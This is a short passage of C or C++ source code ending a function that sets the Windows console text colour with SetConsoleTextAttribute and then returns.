    SetConsoleTextAttribute(hStdOut, wAttributes);

    return;
}
